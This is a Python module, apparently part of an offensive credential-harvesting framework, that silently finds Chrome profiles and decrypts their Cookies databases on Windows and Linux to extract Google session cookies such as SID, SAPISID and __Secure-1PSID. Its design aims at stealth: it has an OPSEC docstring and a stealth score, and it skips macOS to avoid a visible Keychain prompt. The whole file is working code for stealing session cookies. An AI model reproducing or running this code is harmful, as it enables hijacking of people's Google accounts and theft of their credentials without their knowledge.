"""Google browser cookie collector — extracts session cookies via Chromium decrypt.

Extracts Google session cookies (SID, HSID, SSID, APISID, SAPISID, etc.)
from Chrome's encrypted Cookies database using the chromium_decrypt module.

OPSEC:
  - Windows/Linux: SILENT (DPAPI / hardcoded 'peanuts' key)
  - macOS: SKIPPED by default (Keychain prompt is user-visible)
"""

from __future__ import annotations

from typing import List

from ..base import BaseCollector
from .. import CollectorRegistry
from ...types import CollectedToken, DiscoveredToken
from ...secure import secure
from ...platform_utils import chrome_user_data_dir, get_platform


# Google session cookie names used for authenticated API access
_GOOGLE_HOST_PATTERNS = [".google.com", "accounts.google.com"]
_GOOGLE_COOKIE_NAMES = {
    "SID", "HSID", "SSID", "APISID", "SAPISID",
    "__Secure-1PSID", "__Secure-3PSID",
}


@CollectorRegistry.register
class GoogleBrowserCookiesCollector(BaseCollector):
    service = "google"
    source = "browser_cookies"
    stealth_score = 5
    requires = ["cryptography"]
    platforms = ["windows", "linux"]  # Skip macOS — Keychain prompt

    def discover(self) -> List[DiscoveredToken]:
        """Check if Chrome Cookies DB exists with Google cookies."""
        results = []
        chrome_dir = chrome_user_data_dir()

        profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]
        for profile in profiles:
            cookies_db = chrome_dir / profile / "Cookies"
            # Newer Chrome versions use Network/Cookies
            if not cookies_db.exists():
                cookies_db = chrome_dir / profile / "Network" / "Cookies"

            if cookies_db.exists():
                results.append(DiscoveredToken(
                    service=self.service,
                    source=self.source,
                    path=str(cookies_db),
                    account_hint=f"chrome:{profile}",
                    stealth_score=self.stealth_score,
                    details=(
                        f"Google session cookies ({', '.join(sorted(_GOOGLE_COOKIE_NAMES))}); "
                        f"platform={get_platform()}"
                    ),
                ))

        return results

    def collect(self) -> List[CollectedToken]:
        """Extract and decrypt Google session cookies from Chrome."""
        missing = self.check_dependencies()
        if missing:
            self._warn(
                f"Missing dependencies: {', '.join(missing)}. "
                f"Install with: pip install {' '.join(missing)}"
            )
            return []

        from ...core.chromium_decrypt import extract_cookies, get_chrome_key, DecryptError

        try:
            key = get_chrome_key(allow_prompt=False)
        except DecryptError as e:
            self._warn(f"Cannot get Chrome key: {e}")
            return []

        results = []
        profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]

        for profile in profiles:
            try:
                cookies = extract_cookies(
                    profile=profile,
                    host_patterns=_GOOGLE_HOST_PATTERNS,
                    key=key,
                )
            except DecryptError as e:
                self._warn(f"Failed to extract cookies from {profile}: {e}")
                continue
            except Exception as e:
                self._warn(f"Unexpected error extracting from {profile}: {e}")
                continue

            # Filter to only the session cookies we care about
            session_cookies = {
                c["name"]: c for c in cookies
                if c["name"] in _GOOGLE_COOKIE_NAMES
            }

            if not session_cookies:
                continue

            # Build a single CollectedToken per profile with all cookies in extra
            # Use SAPISID or SID as the primary token (most useful for auth)
            primary_name = None
            for candidate in ["SAPISID", "SID", "__Secure-1PSID"]:
                if candidate in session_cookies:
                    primary_name = candidate
                    break

            if not primary_name:
                primary_name = next(iter(session_cookies))

            primary_cookie = session_cookies[primary_name]

            results.append(CollectedToken(
                service=self.service,
                source=self.source,
                stealth_score=self.stealth_score,
                access_token=secure(primary_cookie["value"]),
                extra={
                    "profile": profile,
                    "primary_cookie": primary_name,
                    "cookies": {
                        name: {
                            "value": c["value"],
                            "host": c["host"],
                            "path": c["path"],
                            "secure": c["secure"],
                            "httponly": c["httponly"],
                        }
                        for name, c in session_cookies.items()
                    },
                    "cookie_count": len(session_cookies),
                    "platform": get_platform(),
                },
            ))

            self._info(
                f"Extracted {len(session_cookies)} Google cookies from "
                f"chrome:{profile} ({', '.join(sorted(session_cookies.keys()))})"
            )

        return results
